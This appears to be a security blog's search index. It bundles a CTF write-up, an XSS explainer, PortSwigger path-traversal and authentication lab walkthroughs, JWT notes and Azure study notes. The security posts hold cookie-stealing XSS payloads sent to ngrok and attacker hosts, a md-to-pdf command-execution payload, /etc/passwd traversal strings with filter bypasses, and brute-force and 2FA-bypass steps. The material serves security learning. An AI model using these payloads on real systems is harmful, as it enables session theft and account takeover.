xss, these approach is similar to the bankrobber box in htb.So we can craft the payload to steal the cookie of the admin or the user who will review out ticket.&amp;lt;script&amp;gt; var i=new Image(); i.src=&#39;https://yourip.sa.ngrok.io?cookie=&#39;+escape(document.cookie);&amp;lt;/script&amp;gt;After set up our ngrok proxy and netcat listening in one port, with this payload we can steal the reviewer account cookie.We receive the response and the cookiesession=DeyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1vZGVyYXRvciIsInVpZCI6MTAwLCJpYXQiOjE2NTMwMjI3OTZ9.KpxQxzNncJfI12UlhXA3t7Li8TOB18dNr0FmMCb0ksASo we can create a cookie with the name session and copy the value.From the files we can see that one directory is tickets, so i try to enter and we can see we are moderatorWe see a function to reset a password, maybe we can try an IDOR for User Account Takeover changing the password of admin. Intercepting the request to the reset password function, we can change the uid from 100 to 1, and resend with our password.{&quot;password&quot;:&quot;jesus&quot;,&quot;uid&quot;:&quot;1&quot;}And finally we can login as admin with our password and see our flagHTB{x55_4nd_id0rs_ar3_fun!!}Blinker FluidsChecking the web page of this challenge i can see an invoice list, i can edit, delete and export an invoice in pdf format, an interesting thing is that we submit the invoice in markdown and its converted to pdf, so lets check the source code.We see the add function calls mdhelper to convert the markdown file to pdf, so checking mdhelper.js file we see this:We see that is using the md-to-pdf node module so with some research on google i found this Synk Vuln DB: CVE-2021-23639Code of the POC:const { mdToPdf } = require(&#39;md-to-pdf&#39;);var payload = &#39;---jsn((require(&quot;child_process&quot;)).execSync(&quot;id &amp;gt; /tmp/RCE.txt&quot;))n---RCE&#39;;Then i change the payload to copy the flag, which is in the root directory to the invoice of default in the directory static/invoices, so the payload was:---javascript((require(&quot;child_process&quot;)).execSync(&quot;cp /flag.txt /app/static/invoices/f0daa85f-b9de-4b78-beff-2f86e242d6ac.pdf&quot;)---RCEThen when i open the invoice it gives me an error, but in dev tools i can see the base64 string which is the flag.HTB{bl1nk3r_flu1d_f0r_int3rG4l4c7iC_tr4v3ls}Thanks for read, Happy Hacking!" }, { "title": "Cross Site Scripting (XSS)", "url": "/posts/Cross-Site-Scripting-(XSS)/", "categories": "HTB Writeups, Cyber Apocalypse CTF", "tags": "web security, ctf, owasp", "date": "2022-05-18 11:00:00 -0500", "snippet": "Cross-site scripting known as XSS is a web vulnerability in which malicious scripts are injected int benign and trusted websites. XSS occur when an attacker send malicious code in any user input fields in a browser to a different end-user.MechanismsIn an XSS attack the attacker inject script in HTML code so you’ll have to know javascript and HTML syntax, wbe uses scripts to control client-side application logic and make the website interactive, for example this script generates Hello! pop-up on the web page:&amp;lt;html&amp;gt; &amp;lt;script&amp;gt;alert(&quot;Hello!&quot;);&amp;lt;/script&amp;gt; &amp;lt;h1&amp;gt;Welcome to my page&amp;lt;/h1&amp;gt;&amp;lt;html&amp;gt;Script like this that are embedded in HTML file instead of loaded from are separated file are called inline scripts. These script causes XSS vulnerabilities, scripts can also be loaded from an external file like this: &amp;lt;script src=&quot;URL_OF_EXTERNAL_FILE&quot;&amp;gt;&amp;lt;/script&amp;gt;If the website doesn’t validate the input before render the message, it will cause XSS, validating user input means that the application checks that the user input meets a certain standard, sanitizing in the other hand means that the application modifies special characters in the input that can be used to interfere with HTML logic before further processing.As a result the inline script will cause a redirection to an another url. The src attribute of HTML script tag allwo to load javascript form external source, this code will execute the content of *[https://attacker.om/xss.js/](https://attacker.om/xss.js/) on the victim browser:&amp;lt;script src=http://attacker.com/xss.js&amp;gt;&amp;lt;/script&amp;gt;This example is not exploitable because there is no way of inject this in other users pages, but let´s say the site allow users to subscribe to a newsletter with the URL https://subscribe.com?email?=USER_EMAIL after the user visit this page, they are automatically subscribed, and the confirmation message will appear on the web, so we can inject xss payload for users who visit this URL https://subscribe,com?email=&amp;lt;script&amp;gt;location=&quot;&amp;lt;http://attacker.com&amp;gt;&quot;;&amp;lt;/script&amp;gt; since the malicious script is incorporated in the page, the user will think its safe, so we can access any resources that the browser stores for that site, for example this code will steal user cookies by sending a request to the attacker IP.&amp;lt;script&amp;gt;image=new Image();image.src=&#39;http://atttacker_site_ip/?c=&#39;+document.cookie;&amp;lt;/script&amp;gt;Reflected XSSInput from a user is directly returned to the browser, permitting injection of arbitrary content A classic example would be a URL, which contain a parameter that can be altered by a user, where the input is mirrored and made visible. Example URL: ‘https://example.com/?user=jesus’ Example Output:&amp;lt;span id=&#39;user&#39;&amp;gt; &amp;lt;b&amp;gt; Hi jesus&amp;lt;/b&amp;gt;&amp;lt;/span&amp;gt;Stored XSSInput from a user is stored on the server (database) and returned later without proper escaping and sanitization to the userDOM XSSInput from a user is inserted into the page’s DOM without proper handling, enabling insertion of arbitrary nodesRecognition for XSS Figure out where it goes, embedded in a tag attr or embedded in a script? Figure out how special characters are handled: A good way is to input something like &amp;lt; &amp;gt; &#39; &quot; { } ; : &quot;&amp;gt;&amp;lt;h1&amp;gt;test&amp;lt;/h1&amp;gt; &#39;+alert(1)+&#39; &quot;onmouseover=&quot;alert(1) http://onmouseover=&quot;alert(1)" }, { "title": "Directory Traversal Labs", "url": "/posts/Directory-Path-Traversal/", "categories": "Web Security, Portswigger Academy", "tags": "web security, labs, owasp, lfi", "date": "2022-05-10 11:00:00 -0500", "snippet": "Also known as file path traversal allows to read arbitrary files on the servers. in some cases an attacker might be able to write arbitrary files on the server, allowing them to modify application data or behavior.Reading arbitrary files via directory traversalWe can use the .. characters to access the parent directory, the following strings are several encoding that can help you bypass a poorly implemented filter.For example the url takes a filename parameter and returns the content of the file, the aplicaciones appends the requested filename to this base directort and uses an API to read the contents, so the application implements no defenses against directory traversal attacks,so an attacker can request the following URL to retrieve an arbitrary file from the server’s filesystem:https://insecure-website.com/loadImage?filename=../../../etc/passwdThe sequence ../ is valid within a file path, and means to step up one level in the directory structure. The three consecutive ../ sequences step up from /var/www/images/ to the filesystem root, and so the file that is actually read is:/etc/passwdHere are some encoded ../ values to bypass some wafs.../..\\%2e%2e%2f%252e%252e%252f%c0%ae%c0%ae%c0%af%uff0e%uff0e%u2215%uff0e%uff0e%u2216File path traversal, simple caseObjective: To solve the lab, retrieve the contents of the /etc/passwd file.First we need to find the potential vector to use this vulnerability, so in the web we see an image and when we access the url, we can see a parameter called filename next to the name of the image, we intercept the request of the image with Burpsuite.Then we see that it is making a get request to 22.jpg which is the name of the image.We need to change the name to the requested file, but as we don’t know how many directories back it is, we go back several times with this payload ../../../../../../etc/paswd and when we send the request we retrieve the file with users.Common obstacles to exploiting file path traversal vulnerabilitiesFile path traversal, traversal sequences blocked with absolute path bypassObjective: To solve the lab, retrieve the contents of the /etc/passwd file.This lab its the same approach, the only change is that the directory where the image loads from is the root, so we only have to browse /etc/passwd and we will get the list of users.We use the payload etc/passwd in the filename value.File path traversal, traversal sequences stripped non-recursivelyIn some contexts, such as in a URL path or the filename parameter of a multipart/form-data request, web servers may strip any directory traversal sequences before passing your input to the application.You can sometimes bypass this kind of sanitization by URL encoding, or even double URL encoding, the ../ characters, resulting in %2e%2e%2f or %252e%252e%252f respectively.So using the same approach from previous labs, we’ll use the payload: ....//....//....//etc/passwdFile path traversal, traversal sequences stripped with superfluous URL-decodeThe application blocks input containing path traversal sequences. It then performs a URL-decode of the input before using itSo maybe we can encode the payload with URL-encoding and pass to the application, so we´ll use this payload: ..%252f..%252f..%252fetc%252fpasswd.File path traversal, validation of start of pathThe application transmits the full file path via a request parameter, and validates that the supplied path starts with the expected folder.So we´ll supply the path with the initial folders to the backend, for example the image is in this path /var/www/images/13.jpg so we´ll use this payload: var/www/images/../../../../../etc/passwd to bypass this control.File path traversal, validation of file extension with null byte bypassThe application validates that the supplied filename ends with the expected file extension.So this can be bypassed appending a null byte at the end of the filename, so when implement null byte in file name passwd%00.png, it will remove .png extension from checking. By injecting a null byte, the extension rule won’t be enforced because everything after the null byte will be ignored.So the payload will look like this: ../../../etc/passwd%00How to prevent a directory traversal attackThe most effective way to prevent file path traversal vulnerabilities is to avoid passing user-supplied input to filesystem APIs altogether. Many application functions that do this can be rewritten to deliver the same behavior in a safer way.If it is considered unavoidable to pass user-supplied input to filesystem APIs, then two layers of defense should be used together to prevent attacks: The application should validate the user input before processing it. Ideally, the validation should compare against a whitelist of permitted values. If that isn’t possible for the required functionality, then the validation should verify that the input contains only permitted content, such as purely alphanumeric characters. After validating the supplied input, the application should append the input to the base directory and use a platform filesystem API to canonicalize the path. It should verify that the canonicalized path starts with the expected base directory.Below is an example of some simple Java code to validate the canonical path of a file based on user input:File file = new File(BASE_DIRECTORY, userInput);if (file.getCanonicalPath().startsWith(BASE_DIRECTORY)) { // process file}Thanks for read, happy hacking." }, { "title": "Broken Authentication", "url": "/posts/Broken-Authentication/", "categories": "Web Security, Portswigger Academy", "tags": "web security, theory, owasp, auth", "date": "2022-03-15 11:00:00 -0500", "snippet": "Authentication is the process of verifying the identity of a given user or client. In other words, it involves making sure that they really are who they claim to be, there are three authentication factors: Something you know, such as password or security question, known as “knowledge factors” Something you have, a physical object like a mobile phone or security token, known as “possession factors” Something you are, for example biometrics or patterns of behavior, known as “inherence factors”What is the difference between authentication and authorization?Authentication is the process of verifying that a user is who they claim to be, whereas authorization involves verifying whether a user is allowed to do somethingVulnerabilities in authentication mechanismsA website consists of several mechanisms where vulnerabilities may occur, some of them are broadly applicable across all of these context, we will look the vulnerabilities in the following areas:Vulnerabilities in password based loginBrute force usernames and passwords Its common to see business logins in the format firstname.lastname@company.com, however even if there is no obvious pattern, sometimes high privileged accounts are admin or administrator During auditing you should check HTTP responses to see if any email addresses are disclosed, sometimes responses contain emails addresses of high-privileged users like administrators and IT support In case where the policy requires users to change their passwords regularly, is common to just make minor. predictable changes, for example Mypassword1 becomes Mypassword1?Username enumerationUsername enumeration is when an attacker is able to observe changes in the website’s behavior in order to identify if a given username is valid, usually occurs at the login page, when you are attempting to brute-force a login page, you should pay attention to any differences in: Status codes: During a brute force, the returned status code is likely to be the same in the majority of the guesses, if a guess returns a different status code, maybe the username was correct, is the best practice to always return the same status code regardless of the outcome. Error messages: Sometimes the returned error message is different on whether both username and password are incorrect or only the password was incorrect, the best practice is use identical, generic messages in both cases. Response times: When the requests were handled with a different response times, for example a website might only check whether the password is correct if the username is valid. This extra step might cause a slight increase in the response time. This may be subtle, but an attacker can make this delay more obvious by entering an excessively long password that the website takes noticeably longer to handle.Flawed brute-force protectionThe two most common ways of preventing brute-force attacks are: Locking the account that the remote user is trying to access if they make too many failed login attempts Blocking the remote user IP address if they make too many login attempts in succession In some cases the counter of the failed attempts resets if the IP owner logs in successfully, so an attacker would simply have to log in to their account every few attempts to prevent this limit, so put your credential in the wordlist and you will bypass this. We can send multiple credential per request in json format if the web is vulnerable to brute-forceAccount locking If the number of login attempts exceed, responses from the server indicating that the account is locked can help an attacker to enumerate usernamesUser rate limitingMaking too many login requests within a short period of time causes your IP to be blocked, the IP can be unblocked in this cases: Automatically after a certain period of time has elapsed Manually by an administrator Manually by the user after successfully completing a CAPTCHAAs the limit is based in the rate of HTTP requests sent from the user IP address, it sometimes also possible to bypass this defense if you guess multiple passwords with a single request.HTTP basic authenticationAuthorization: Basic base64(username:passwrord)This is not considered a safe authentication method, it involves repeatedly sending the user credential in every request, that can leads to MITM attacks, HTTP basic authentication is also particularly vulnerable to session-related exploits, notably CSRF, against which it offers no protection on its own.Vulnerabilities in multi-factor authenticationFlawed two-factor verification logic Means that after user has completed the login step, the website not adequately verify that the same user is completing the second stepFor example: The user logins with their normal credentials in the first step POST /login-steps/first HTTP/1.1 Host: vulnerable-website.com ... username=carlos&amp;amp;password=qwerty Then he are assigned with a cookie related to his account before going to the second step When submitting the verification code, the request need the account cookie to determine the user who is trying to access `POST /login-steps/second HTTP/1.1 Host: vulnerable-website.com Cookie: account=carlos ... verification-code=123456` An attacker could use any other username when submitting the verification code This is dangerous because an attacker is able to brute-force the verification code as it would allow them to log in to any user based only in the usernameBrute-forcing 2FA verification codes Some websites implement the login out the user if they enter certain number of incorrect verification codes, this is ineffective, because it can be automated with multi-step process by using Turbo Intruder plugin. Vulnerabilities in other authentication mechanisms Preventing attacks on your own authentication mechanismsTake care with user credentials Do not send any login data over unencrypted connections, although you may have implemented HTTPS for your login requests, make sure to redirect any attempted HTTP request to HTTPS as well Audit your website to make sure that no username or email addresses are disclosed either through publicly accessible profiles or reflected in HTTP responsesDon’t count on users for security Implement an effective password policy, not the traditional, instead implement a simple password checker, for example the Javascript library zxcvbn By only allowing passwords which are rated highly by the password checker, you can enforce the use of secure passwords more effectively than you can with traditional policiesPrevent username enumeration Regardless of whether an attempted username is valid, it is important to use identical, generic error messages, and make sure they are really identical Your should always return the same HTTP status code with each login request and, finally make the response time in different scenarios as indistinguishable as possibleImplement robust brute-force protection Implement strict, IP-based user rate limiting, this should involve measures to prevent attacker from manipulating their apparent IP address, ideally you should require to complete a Captcha test with every login attempt This is not guaranteed to eliminate the threat, however making the process tedious for the attackerTriple-check your verification logic Is easy for simple logic flaws to creep into code which, in case of authentication, have the potential to completely compromise your web an users Auditing any verification or validation logic thoroughly to eliminate flaws is absolutely key to robust authenticationImplement proper multi-factor authentication SMS-based 2FA is technically verifying two factors, however the potential for abuse through SIM swapping, instead use a dedicated app or device that generates the verification code directly Make sure that the logic in your 2FA checks is sound so that it cannot be easily bypassed" }, { "title": "Broken Authentication Labs", "url": "/posts/Broken-Authentication-Labs/", "categories": "Web Security, Portswigger Academy", "tags": "web security, labs, owasp, auth", "date": "2022-03-15 11:00:00 -0500", "snippet": "Vulnerabilities in password-based loginUsername enumeration via different responses With Burp running, investigate the login page and submit an invalid username and password. In Burp, go to Proxy &amp;gt; HTTP history and find the POST /login request. Send this to Burp Intruder. In Burp Intruder, go to the Positions tab. Make sure that the Sniper attack type is selected. Click Clear § to remove any automatically assigned payload positions. Highlight the value of the username parameter and click Add § to set it as a payload position. This position will be indicated by two § symbols, for example: username=§invalid-username§. Leave the password as any static value for now. On the Payloads tab, make sure that the Simple list payload type is selected. Under Payload options, paste the list of candidate usernames. Finally, click Start attack. The attack will start in a new window. When the attack is finished, on the Results tab, examine the Length column. You can click on the column header to sort the results. Notice that one of the entries is longer than the others. Compare the response to this payload with the other responses. Notice that other responses contain the message Invalid username, but this response says Incorrect password. Make a note of the username in the Payload column. Close the attack and go back to the Positions tab. Click Clear, then change the username parameter to the username you just identified. Add a payload position to the password parameter. The result should look something like this: username=identified-user&amp;amp;password=§invalid-password§ On the Payloads tab, clear the list of usernames and replace it with the list of candidate passwords. Click Start attack. When the attack is finished, look at the Status column. Notice that each request received a response with a 200 status code except for one, which got a 302 response. This suggests that the login attempt was successful - make a note of the password in the Payload column. Log in using the username and password that you identified and access the user account page to solve the lab.Username enumeration via subtly different responses With Burp running, submit an invalid username and password. Send the POST /login request to Burp Intruder and add a payload position to the username parameter. On the Payloads tab, make sure that the Simple list payload type is selected and add the list of candidate usernames. On the Options tab, under Grep - Extract, click Add. In the dialog that appears, scroll down through the response until you find the error message Invalid username or password.. Use the mouse to highlight the text content of the message. The other settings will be automatically adjusted. Click OK and then start the attack. When the attack is finished, notice that there is an additional column containing the error message you extracted. Sort the results using this column to notice that one of them is subtly different. Look closer at this response and notice that it contains a typo in the error message instead of a full stop/period, there is a trailing space. Make a note of this username. Close the attack and go back to the Positions tab. Insert the username you just identified and add a payload position to the password parameter: username=identified-user&amp;amp;password=§invalid-password§ On the Payloads tab, clear the list of usernames and replace it with the list of passwords. Start the attack. When the attack is finished, notice that one of the requests received a 302 response. Make a note of this password. Log in using the username and password that you identified and access the user account page to solve the lab.Username enumeration via response timing With Burp running, submit an invalid username and password, then send the POST /login request to Burp Repeater. Experiment with different usernames and passwords. Notice that your IP will be blocked if you make too many invalid login attempts. Identify that the X-Forwarded-For header is supported, which allows you to spoof your IP address and bypass the IP-based brute-force protection. Continue experimenting with usernames and passwords. Pay particular attention to the response times. Notice that when the username is invalid, the response time is roughly the same. However, when you enter a valid username (your own), the response time is increased depending on the length of the password you entered. Send this request to Burp Intruder and select the attack type to Pitchfork. Clear the default payload positions and add the X-Forwarded-For header. Add payload positions for the X-Forwarded-For header and the username parameter. Set the password to a very long string of characters (about 100 characters should do it). On the Payloads tab, select payload set 1. Select the Numbers payload type. Enter the range 1 - 100 and set the step to 1. Set the max fraction digits to 0. This will be used to spoof your IP. Select payload set 2 and add the list of usernames. Start the attack. When the attack finishes, at the top of the dialog, click Columns and select the Response received and Response completed options. These two columns are now displayed in the results table. Notice that one of the response times was significantly longer than the others. Repeat this request a few times to make sure it consistently takes longer, then make a note of this username. Create a new Burp Intruder attack for the same request. Add the X-Forwarded-For header again and add a payload position to it. Insert the username that you just identified and add a payload position to the password parameter. On the Payloads tab, add the list of numbers in payload set 1 and add the list of passwords to payload set 2. Start the attack. When the attack is finished, find the response with a 302 status. Make a note of this password. Log in using the username and password that you identified and access the user account page to solve the lab.Broken brute-force protection, IP block With Burp running, investigate the login page. Observe that your IP is temporarily blocked if you submit 3 incorrect logins in a row. However, notice that you can reset the counter for the number of failed login attempts by logging in to your own account before this limit is reached. Enter an invalid username and password, then send the POST /login request to Burp Intruder. Create a pitchfork attack with payload positions in both the username and password parameters. On the Resource pool tab, add the attack to a resource pool with Maximum concurrent requests set to 1. By only sending one request at a time, you can ensure that your login attempts are sent to the server in the correct order. On the Payloads tab, select payload set 1. Add a list of payloads that alternates between your username and carlos. Make sure that your username is first and that carlos is repeated at least 100 times. Edit the list of candidate passwords and add your own password before each one. Make sure that your password is aligned with your username in the other list. Add this list to payload set 2 and start the attack. When the attack finishes, filter the results to hide responses with a 200 status code. Sort the remaining results by username. There should only be a single 302 response for requests with the username carlos. Make a note of the password from the Payload 2 column. Log in to Carlos’s account using the password that you identified and access his account page to solve the lab.Username enumeration via account lock With Burp running, investigate the login page and submit an invalid username and password. Send the POST /login request to Burp Intruder. Select the attack type Cluster bomb. Add a payload position to the username parameter. Add a blank payload position to the end of the request body by clicking Add § twice. The result should look something like this: username=§invalid-username§&amp;amp;password=example§§ On the Payloads tab, add the list of usernames to the first payload set. For the second set, select the Null payloads type and choose the option to generate 5 payloads. This will effectively cause each username to be repeated 5 times. Start the attack. In the results, notice that the responses for one of the usernames were longer than responses when using other usernames. Study the response more closely and notice that it contains a different error message: You have made too many incorrect login attempts. Make a note of this username. Create a new Burp Intruder attack on the POST /login request, but this time select the Sniper attack type. Set the username parameter to the username that you just identified and add a payload position to the password parameter. Add the list of passwords to the payload set and create a grep extraction rule for the error message. Start the attack. In the results, look at the grep extract column. Notice that there are a couple of different error messages, but one of the responses did not contain any error message. Make a note of this password. Wait for a minute to allow the account lock to reset. Log in using the username and password that you identified and access the user account page to solve the lab.Broken brute-force protection, multiple credentials per request With Burp running, investigate the login page. Notice that the POST /login request submits the login credentials in JSON format. Send this request to Burp Repeater. In Burp Repeater, replace the single string value of the password with an array of strings containing all of the candidate passwords. For example: &quot;username&quot; : &quot;carlos&quot;, &quot;password&quot; : [ &quot;123456&quot;, &quot;password&quot;, &quot;qwerty&quot; ... ] Send the request. This will return a 302 response. Right-click on this request and select Show response in browser. Copy the URL and load it in your browser. The page loads and you are logged in as carlos. Click My account to access Carlos’s account page and solve the labVulnerabilities in multi-factor authentication2FA simple bypass Log in to your own account. Your 2FA verification code will be sent to you by email. Click the Email client button to access your emails. Go to your account page and make a note of the URL. Log out of your account. Log in using the victim’s credentials. When prompted for the verification code, manually change the URL to navigate to /my-account. The lab is solved when the page loads.2FA broken logic With Burp running, log in to your own account and investigate the 2FA verification process. Notice that in the POST /login2 request, the verify parameter is used to determine which user’s account is being accessed. Log out of your account. Send the GET /login2 request to Burp Repeater. Change the value of the verify parameter to carlos and send the request. This ensures that a temporary 2FA code is generated for Carlos. Go to the login page and enter your username and password. Then, submit an invalid 2FA code. Send the POST /login2 request to Burp Intruder. In Burp Intruder, set the verify parameter to carlos and add a payload position to the mfa-code parameter. Brute-force the verification code. Load the 302 response in your browser. Click My account to solve the lab.2FA bypass using a brute-force attack With Burp running, log in as carlos and investigate the 2FA verification process. Notice that if you enter the wrong code twice, you will be logged out again. You need to use Burp’s session handling features to log back in automatically before sending each request. In Burp, go to Project options &amp;gt; Sessions. In the Session Handling Rules panel, click Add. The Session handling rule editor dialog opens. In the dialog, go to the Scope tab. Under URL Scope, select the option Include all URLs. Go back to the Details tab and under Rule Actions, click Add &amp;gt; Run a macro. Under Select macro click Add to open the Macro Recorder. Select the following 3 requests: GET /login POST /login GET /login2 Then click OK. The Macro Editor dialog opens. Click Test macro and check that the final response contains the page asking you to provide the 4-digit security code. This confirms that the macro is working correctly. Keep clicking OK to close the various dialogs until you get back to the main Burp window. The macro will now automatically log you back in as Carlos before each request is sent by Burp Intruder. Send the POST /login2 request to Burp Intruder. In Burp Intruder, add a payload position to the mfa-code parameter. On the Payloads tab, select the Numbers payload type. Enter the range 0 - 9999 and set the step to 1. Set the min/max integer digits to 4 and max fraction digits to 0. This will create a payload for every possible 4-digit integer. Go to the Resource pool tab and add the attack to a resource pool with the Maximum concurrent requests set to 1. Start the attack. Eventually, one of the requests will return a 302 status code. Right-click on this request and select Show response in browser. Copy the URL and load it in your browser. Click My account to solve the lab.Vulnerabilities in other authentication mechanismsBrute-forcing a stay-logged-in cookie With Burp running, log in to your own account with the Stay logged in option selected. Notice that this sets a stay-logged-in cookie. Examine this cookie in the Inspector panel and notice that it is Base64-encoded. Its decoded value is wiener:51dc30ddc473d43a6011e9ebba6ca770. Study the length and character set of this string and notice that it could be an MD5 hash. Given that the plaintext is your username, you can make an educated guess that this may be a hash of your password. Hash your password using MD5 to confirm that this is the case. We now know that the cookie is constructed as follows: base64(username+&#39;:&#39;+md5HashOfPassword) Log out of your account. Send the most recent GET /my-account request to Burp Intruder. In Burp Intruder, add a payload position to the stay-logged-in cookie and add your own password as a single payload. Under Payload processing, add the following rules in order. These rules will be applied sequentially to each payload before the request is submitted. Hash: MD5 Add prefix: wiener: Encode: Base64-encode As the Update email button is only displayed when you access the /my-account page in an authenticated state, we can use the presence or absence of this button to determine whether we’ve successfully brute-forced the cookie. On the Options tab, add a grep match rule to flag any responses containing the string Update email. Start the attack. Notice that the generated payload was used to successfully load your own account page. This confirms that the payload processing rules work as expected and you were able to construct a valid cookie for your own account. Make the following adjustments and then repeat this attack: Remove your own password from the payload list and add the list of candidate passwords instead. Change the Add prefix rule to add carlos: instead of wiener:. When the attack is finished, the lab will be solved. Notice that only one request returned a response containing Update email. The payload from this request is the valid stay-logged-in cookie for Carlos’s account.Offline password cracking With Burp running, use your own account to investigate the “Stay logged in” functionality. Notice that the stay-logged-in cookie is Base64 encoded. In the Proxy &amp;gt; HTTP history tab, go to the Response to your login request and highlight the stay-logged-in cookie, to see that it is constructed as follows: username+&#39;:&#39;+md5HashOfPassword You now need to steal the victim user’s cookie. Observe that the comment functionality is vulnerable to XSS. Go to the exploit server and make a note of the URL. Go to one of the blogs and post a comment containing the following stored XSS payload, remembering to enter your own exploit server ID: &amp;lt;script&amp;gt;document.location=&#39;//your-exploit-server-id.web-security-academy.net/&#39;+document.cookie&amp;lt;/script&amp;gt; On the exploit server, open the access log. There should be a GET request from the victim containing their stay-logged-in cookie. Decode the cookie in Burp Decoder. The result will be: carlos:26323c16d5f4dabff3bb136f2460a943 Copy the hash and paste it into a search engine. This will reveal that the password is onceuponatime. Log in to the victim’s account, go to the “My account” page, and delete their account to solve the lab.Password reset broken logic With Burp running, click the Forgot your password? link and enter your own username. Click the Email client button to view the password reset email that was sent. Click the link in the email and reset your password to whatever you want. In Burp, go to Proxy &amp;gt; HTTP history and study the requests and responses for the password reset functionality. Observe that the reset token is provided as a URL query parameter in the reset email. Notice that when you submit your new password, the POST /forgot-password?temp-forgot-password-token request contains the username as hidden input. Send this request to Burp Repeater. In Burp Repeater, observe that the password reset functionality still works even if you delete the value of the temp-forgot-password-token parameter in both the URL and request body. This confirms that the token is not being checked when you submit the new password. In your browser, request a new password reset and change your password again. Send the POST /forgot-password?temp-forgot-password-token request to Burp Repeater again. In Burp Repeater, delete the value of the temp-forgot-password-token parameter in both the URL and request body. Change the username parameter to carlos. Set the new password to whatever you want and send the request. In your browser, log in to Carlos’s account using the new password you just set. Click My account to solve the lab.Password reset poisoning via middleware With Burp running, investigate the password reset functionality. Observe that a link containing a unique reset token is sent via email. Send the POST /forgot-password request to Burp Repeater. Notice that the X-Forwarded-Host header is supported and you can use it to point the dynamically generated reset link to an arbitrary domain. Go to the exploit server and make a note of your exploit server URL. Go back to the request in Burp Repeater and add the X-Forwarded-Host header with your exploit server URL: X-Forwarded-Host: your-exploit-server-id.web-security-academy.net Change the username parameter to carlos and send the request. Go to the exploit server and open the access log. You should see a GET /forgot-password request, which contains the victim’s token as a query parameter. Make a note of this token. Go back to your email client and copy the valid password reset link (not the one that points to the exploit server). Paste this into your browser and change the value of the temp-forgot-password-token parameter to the value that you stole from the victim. Load this URL and set a new password for Carlos’s account. Log in to Carlos’s account using the new password to solve the lab.Password brute-force via password change With Burp running, log in and experiment with the password change functionality. Observe that the username is submitted as hidden input in the request. Notice the behavior when you enter the wrong current password. If the two entries for the new password match, the account is locked. However, if you enter two different new passwords, an error message simply states Current password is incorrect. If you enter a valid current password, but two different new passwords, the message says New passwords do not match. We can use this message to enumerate correct passwords. Enter your correct current password and two new passwords that do not match. Send this POST /my-account/change-password request to Burp Intruder. In Burp Intruder, change the username parameter to carlos and add a payload position to the current-password parameter. Make sure that the new password parameters are set to two different values. For example: username=carlos&amp;amp;current-password=§incorrect-password§&amp;amp;new-password-1=123&amp;amp;new-password-2=abc On the Payloads tab, enter the list of passwords as the payload set On the Options tab, add a grep match rule to flag responses containing New passwords do not match. Start the attack. When the attack finished, notice that one response was found that contains the New passwords do not match message. Make a note of this password. In your browser, log out of your own account and lock back in with the username carlos and the password that you just identified. Click My account to solve the lab." }, { "title": "Attacking Json Web Tokens", "url": "/posts/Attacking-JSON-Web-Tokens/", "categories": "", "tags": "", "date": "2022-02-17 00:00:00 -0500", "snippet": "Some acronyms: JOSE: Javascript Object Signing and Encryption The name of the working group JWT: JSON Web TOKEN JWE: JSON Web Encryption JWS: JSON Web Signature JWK: JSON Web Key JWA: JSON Web Algorithm“Encryption gives you confidentiality but signature gives you integrity”JWT has 3 parts separated by a dot: Header (base 64 url encoded without padding(no ‘/’, ‘+’, ‘=’)) Contain an algorithm “alg” attribute to tell how the token was signed Support a lot of different algorithms (HS256, HS384, HS512, None, …) Payload (base 64 url encoded without padding no ‘/’, ‘+’, ‘=’)) May contain anything Use registered claims “iss”: issuer “sub”: subject “aud”: audience “jti”: claim id “exp”: expiration time “nbf”: not before “iat”: issued at Signature (base 64 encoded)The JWT Format: AlgorithmsHMAC: All services need to know the secretExample: One client talks to multiple services (application, microservices), if you use HMAC, if one of the server get compromised and the secret code is compromised you can send tampered token to everyone else and you can perform critical actions with that token.Asymmetric: you share the private key only to trusted services(login, registration, pass reset)If one of your lower security system get popped nothing happens because the server doesn’t has the private key" }, { "title": "Microsoft Azure Fundamentals (AZ-900) Notes", "url": "/posts/Azure-Fundamentals-Notes/", "categories": "Cloud, Certification Notes", "tags": "azure, notes, certification", "date": "2022-02-16 11:00:00 -0500", "snippet": "Cloud ConceptsBenefits of cloud computingScalability: ability to accommodate a larger load by making the hardware stronger(vertical), or by adding nodes (horizontal)Elasticity: once a system is scalable, elasticity mean that there will be ‘auto scaling’, based on the load, this is cloud friendly : pay per use, match, optimize costsAgility: (not related to scalability), new IT resources are only a click away, it mean that you reduce the time to make those resources available to your developers from weeks to minutesAvailability: goes in hand with horizontal scaling, mean running your application at least in 2 availability zones, the goal is to survive a data center loss (disaster)Differences between CapEx and OpEx and Consumption-based modelCapital Expenditure (on-premise): Purchasing some assets upfront (servers) and I need to use for a certain timeOperational Expenditure (the cloud): Consumption by the pay for what i use as i am use it, gives flexibilityA consumption-based pricing model is a service provision and payment scheme in which the customer pays according to the resources used. This model is essentially the same as the utility computing payment structure and those of other utilities, such as water and electricity.Differences between categories of cloud servicesInfrastructure as a Service (IaaS) Provide building blocks for cloud IT Provide networking, computers, data storage space Highest level of flexibility Simulate the look from managing physical resources Eg: VMs, Blob Storage, GCP, Digital Ocean, Elastic Load BalancingPlatform as a Service (PaaS) Remove the company to manage underlying infrastructure Focus on deployment and management of applications You will define the behavior and environment for your application (code) Eg: Heroku, EKS, ACI Software as a Service (SaaS) Completed product that is run and managed by the service provider offer services meant to be accessed by end users Eg: Gmail, Outlook, Recognition for ML, ZoomShared Responsibility model:Differences between types of cloud computingCloud computing is the delivery of computing services—including servers, storage, databases, networking, software, analytics, and intelligence—over the Internet (“the cloud”) to offer faster innovation, flexible resources, and economies of scale. You typically pay only for cloud services you use, helping you lower your operating costs, run your infrastructure more efficiently, and scale as your business needs change. Public Cloud: Limitless, many regions, over internet, like Azure, AWS or GCP Hybrid Cloud: We are using both, like provide some services from my servers and in busy days provide from the cloud Private Cloud: Management of servers, more customizable, we can bring azure capabilities on premise with Azure Stack and Azure arcAzure Core ServicesCore Azure Architectural ComponentsRegionA region is a group of data centers that interact to provide redundancy and availability for the services hosted within that region. For example, West US, Central US and North Central US are three of many regions, each one is paired with another in the same geography to allow replication of resources and reduce data loss.Microsoft establishes and controls the pairing of regions, you cannot choose a region pair, however you choose the region in which deploy a service, which indirectly determines which other region is in the pair.Availability ZonesThey area data centers that are grouped in regions with low latency connection, we can pick up to 3 AZ when deploying a service, there are no correlation between buildings and subscriptions.Azure availability zones-enabled services are designed to provide the right level of resiliency and flexibility. They can be configured in two ways. They can be either zone redundant, with automatic replication across zones, or zonal, with instances pinned to a specific zone. You can also combine these approaches.Some organizations require high availability of availability zones and protection from large-scale phenomena and regional disasters. Azure regions are designed to offer protection against localized disasters with availability zones and protection from regional or large geography disasters with disaster recovery, by making use of 